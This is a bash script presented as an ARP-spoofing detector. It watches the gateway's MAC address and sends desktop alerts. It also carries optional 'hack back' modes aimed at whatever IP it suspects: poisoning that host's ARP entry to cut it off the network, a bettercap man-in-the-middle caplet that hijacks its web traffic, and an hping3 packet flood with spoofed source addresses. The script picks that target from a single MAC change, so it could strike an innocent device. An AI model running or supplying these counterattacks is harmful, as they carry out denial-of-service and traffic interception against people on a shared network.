#!/bin/bash
# ARP Guard Extended - First Strike Edition
# Requires: arp-scan, arpspoof (dsniff), hping3, terminal-notifier, bettercap

### CONFIG ###
INTERFACE="en0"  # change to your network interface
SCAN_INTERVAL=10 # seconds between scans
GATEWAY_IP=$(netstat -rn | awk '/default/ {print $2; exit}') # Default gateway IP

# Reaction toggles (true/false)
just_alert=true
send_message=false
MESSAGE="Stop ARP spoofing, asshole. You've been caught."
drop_network=false
rickroll=false
first_strike=false
hping_flood=false

# Where to store last scan
SCAN_FILE=$(mktemp)
PREVIOUS_FILE=$(mktemp)

# Cleanup on Ctrl+C
cleanup() {
    echo -e "\n[*] Stopping all active attacks and exiting..."
    pkill -f arpspoof
    pkill -f hping3
    pkill -f bettercap
    exit 0
}
trap cleanup INT

echo "[*] Starting ARP Guard Extended - First Strike on $INTERFACE"
echo "[*] Press Ctrl+C to stop."

# Initial scan
sudo arp -a > "$PREVIOUS_FILE"

while true; do
    sudo arp -a > "$SCAN_FILE"

    # Extract gateway MACs from both scans
    OLD_MAC=$(grep "$GATEWAY_IP" "$PREVIOUS_FILE" | awk '{print $4}')
    NEW_MAC=$(grep "$GATEWAY_IP" "$SCAN_FILE" | awk '{print $4}')

    if [ "$OLD_MAC" != "$NEW_MAC" ]; then
        echo "[!] Default Gateway MAC changed! Possible ARP spoof!"
        echo "Old MAC: $OLD_MAC"
        echo "New MAC: $NEW_MAC"

        ATTACKER_MAC="$NEW_MAC"
        ATTACKER_IP=$(grep "$ATTACKER_MAC" "$SCAN_FILE" | awk '{print $2}' | sed 's/[()]//g')

        echo "[*] Suspected Attacker: IP=$ATTACKER_IP MAC=$ATTACKER_MAC"

        if [ "$just_alert" = true ]; then
            terminal-notifier -title "ARP Guard Alert" -message "Gateway spoof detected from $ATTACKER_IP ($ATTACKER_MAC)"
        fi

        if [ "$drop_network" = true ]; then
            echo "[*] Dropping network for $ATTACKER_MAC..."
            sudo arpspoof -i "$INTERFACE" -t "$ATTACKER_IP" 0.0.0.0 >/dev/null 2>&1 &
        fi

        if [ "$send_message" = true ]; then
            echo "[*] Sending revenge message to $ATTACKER_IP..."
            echo "$MESSAGE" | nc -w 3 "$ATTACKER_IP" 4444
        fi

        if [ "$rickroll" = true ]; then
            echo "[*] Rickrolling $ATTACKER_IP..."
            RICKROLL_CAP="/tmp/rickroll_${ATTACKER_IP}.cap"
            cat > "$RICKROLL_CAP" <<EOF
set arp.spoof.targets $ATTACKER_IP
set arp.spoof.internal true
arp.spoof on
set http.server.address 0.0.0.0
set http.server.port 80
http.server on
set http.proxy.script /tmp/rickroll.js
http.proxy on
EOF

            cat > /tmp/rickroll.js <<EOF
function onRequest(req, res) {
    res.status = 302;
    res.headers["Location"] = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    res.body = "";
    return res;
}
EOF
            sudo bettercap -iface "$INTERFACE" -caplet "$RICKROLL_CAP" >/dev/null 2>&1 &
            echo "[+] Rickroll attack launched against $ATTACKER_IP"
        fi

        if [ "$first_strike" = true ]; then
            echo "[*] FIRST STRIKE MODE: Nuking $ATTACKER_IP immediately..."
            sudo arpspoof -i "$INTERFACE" -t "$ATTACKER_IP" 0.0.0.0 >/dev/null 2>&1 &
        fi

        if [ "$hping_flood" = true ]; then
            echo "[*] Flooding $ATTACKER_IP with garbage packets..."
            sudo hping3 --flood --rand-source "$ATTACKER_IP" >/dev/null 2>&1 &
        fi
    fi

    cp "$SCAN_FILE" "$PREVIOUS_FILE"
    sleep $SCAN_INTERVAL
done
